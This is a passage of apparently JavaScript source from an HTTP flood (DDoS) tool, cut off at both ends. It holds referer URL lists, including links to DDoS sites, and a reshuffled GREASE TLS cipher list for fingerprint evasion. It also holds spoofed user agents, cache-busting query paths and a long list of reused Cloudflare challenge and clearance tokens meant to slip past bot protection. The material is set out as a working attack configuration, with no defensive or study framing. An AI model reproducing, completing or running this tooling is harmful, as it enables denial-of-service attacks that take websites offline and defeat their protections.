  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://play.google.com/store/search?q=",
  "https://pornhub.com/",
  "https://r.search.yahoo.com/",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://steamcommunity.com/market/search?q=",
  "https://vk.com/profile.php?redirect=",
  "https://www.bing.com/search?q=",
  "https://www.cia.gov/index.html",
  "https://www.facebook.com/",
  "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
  "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
  "https://www.fbi.com/",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.co.ao/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.com/search?q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
  "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
  "https://www.npmjs.com/search?q=",
  "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
  "https://www.pinterest.com/search/?q=",
  "https://www.qwant.com/search?q=",
  "https://www.ted.com/search?q=",
  "https://www.usatoday.com/search/results?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://www.youtube.com/",
  "https://yandex.ru/",
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    'http://host-tracker.com/check_page/?furl=',
    'http://itch.io/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'http://jobs.bloomberg.com/search?q=',
    'http://jobs.leidos.com/search?q=',
    'http://jobs.rbs.com/jobs/search?q=',
    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://louis-ddosvn.rhcloud.com/f5.html?v=',
    'http://millercenter.org/search?q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
    'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
    'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
    'http://search.aol.com/aol/search?q=',
    'http://taginfo.openstreetmap.org/search?q=',
    'http://techtv.mit.edu/search?q=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://vk.com/profile.php?redirect=',
    'http://www.ask.com/web?q=',
    'http://www.baoxaydung.com.vn/news/vn/search&q=',
    'http://www.bestbuytheater.com/events/search?q=',
    'http://www.bing.com/search?q=',
    'http://www.evidence.nhs.uk/search?q=',
    'http://www.google.com/?q=',
    'http://www.google.com/translate?u=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'http://www.pagescoring.com/website-speed-test/?url=',
    'http://www.reddit.com/search?q=',
    'http://www.search.com/search?q=',
    'http://www.shodanhq.com/search?q=',
    'http://www.ted.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://www.ustream.tv/search?q=',
    'http://yandex.ru/yandsearch?text=',
    'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
    'http://ytmnd.com/search?q=',
    'https://add.my.yahoo.com/rss?url=',
    'https://careers.carolinashealthcare.org/search?q=',
    'https://check-host.net/',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://drive.google.com/viewerng/viewer?url=',
    'https://duckduckgo.com/?q=',
    'https://google.com/',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=',
    'https://help.baidu.com/searchResult?keywords=',
    'https://play.google.com/store/search?q=',
    'https://pornhub.com/',
    'https://r.search.yahoo.com/',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://steamcommunity.com/market/search?q=',
    'https://vk.com/profile.php?redirect=',
    'https://www.bing.com/search?q=',
    'https://www.cia.gov/index.html',
    'https://www.facebook.com/',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://www.fbi.com/',
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    'https://www.google.al/search?q=',
    'https://www.google.co.ao/search?q=',
    'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=',
    'https://www.google.com/search?q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
    'https://www.npmjs.com/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.pinterest.com/search/?q=',
    'https://www.qwant.com/search?q=',
    'https://www.ted.com/search?q=',
    'https://www.usatoday.com/search/results?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://www.youtube.com/',
    'https://yandex.ru/',
    'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D',
 ];



 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");

 useragents = [
    '(CheckSecurity 2_0)',
    '(BraveBrowser 5_0)',
    '(ChromeBrowser 3_0)',
    '(ChromiumBrowser 4_0)',
    '(AtakeBrowser 2_0)',
    '(NasaChecker)',
    '(CloudFlareIUAM)',
    '(NginxChecker)',
    '(AAPanel)',
    '(AntiLua)',
    '(FushLua)',
    '(FBIScan)',
    '(FirefoxTop)',
    '(ChinaNet Bot)'
   ];
 
 const queryStrings = [
    "&", 
    "=", 
  ];
  
  const pathts = [
    "?page=1",
    "?page=2",
    "?page=3",
    "?category=news",
    "?category=sports",
    "?category=technology",
    "?category=entertainment", 
    "?sort=newest",
    "?filter=popular",
    "?limit=10",
    "?start_date=1989-06-04",
    "?end_date=1989-06-04",
    "/?r=*****",
    "/?r=12364",
    "/?r=16364",
    "/?r=65655",
    "/?r=65955",
    "/?r=14254",
    "/?r=12654",
    "/?r=66455",
    "/?r=18694",
    "/?r=12364",
    "/?r=6566664645",
    "/?r=125234",
    "/?r=16365",
    "/?r=16354",
    "/?r=123964",
    "/?r=656664645",
    "/?r=12524",
    "/?r=163665",
    "/?r=16354",
    "/?r=12334",
    "/?a=[+F10]&b=[+N5]",
    "/?a=[+F1]&b=[+N5]",
    "/?a=[+F130]&b=[+N52]",
    "/?a=[+F1042]&b=[+N52]",
    "/?a=[+F16685]&b=[+N5]",
    "/?a=[+F8551]&b=[+N5]",
    "/?a=[+F130]&b=[+N52]",
    "/?a=[+F1042]&b=[+N52]",
    "/?a=[+F10]&b=[+N5]",
    "/?a=[+F56551]&b=[+N5]",
    "/?a=[+F1350]&b=[+N52]",
    "/?a=[+F1520]&b=[+N52]",
    "/?uername=zlq&age=20",
    "/?uername=zlq&age=2",
    "/?yqlaje=an4ux1&amp;__CBK=3f3c8201870c33a8b8c92687ed8a1698d1603344084_326369&amp;wmnqjm=agpws2&amp;naxyty=jxxv22&amp;fktade=draxv1&amp;qybcjc=4pyt12&amp;vunwfk=dgwq82&qifuha=gk0u32",
];

  const cookie = [
    "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
    "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
    "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
    "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
    "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
    "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
    "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
    "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
    "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
    "?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
    "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
    "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
    "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
    "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
    "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
    "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
    "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
    "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
    "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
    "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
    "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
    "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
    "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
    "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
    "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
    "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
    "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
    "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
    "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
    "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
    "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
    "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs", "?page=1", "?page=2", "?page=3", "?category=news", "?category=sports", "?category=technology", "?category=entertainment", "?sort=newest", "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04",    
    "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
    "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
    "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
    "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
    "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
    "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
    "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
    "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
    "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
    "?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
    "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
    "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
    "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
    "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
    "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
    "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
    "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
    "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
    "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
    "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
    "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
    "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
    "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U",
    "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
    "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
    "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
    "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
    "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
    "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
    "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
    "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
    "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
    "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs",
    "PHPSESSID=9vgqs235r45g9qfcpqcqikv86q; mysid=1cf6bb6e36491d53c0f9fc261cfbb792; counter=1; Hm_lvt_b4a4918d5abe40ec265dbc08481d477a=1603519390; Hm_lpvt_b4a4918d5abe40ec265dbc08481d477a=1603519390",
    "PHPSESSID=vj2qrg9j181qvdtavd8t8p7jd0; _ga=GA1.2.243460572.1603519150; _gid=GA1.2.729864228.1603519150; _gat=1",
    "c6c28a16698798d9ab69e5ac491ba86aextend_contents_views=852",
    "9WoS_2132_saltkey=zl3E3rvm; 9WoS_2132_lastvisit=1603425355; 9WoS_2132_lastact=1603428955%09forum.php%09; 9WoS_2132_onlineusernum=1",
    "c6c28a16698798d9ab69e5ac491ba86aextend_contents_views=852",
    ];

  const mozilla = [
    'Mozilla/5.0 ',
    'Mozilla/6.0 ',
    'Mozilla/7.0 ',
    'Mozilla/8.0 ',
    'Mozilla/9.0 '
   ];

   function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }

   const uap = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
    'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
    'Mozilla/5.0 (Linux; Android 11; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
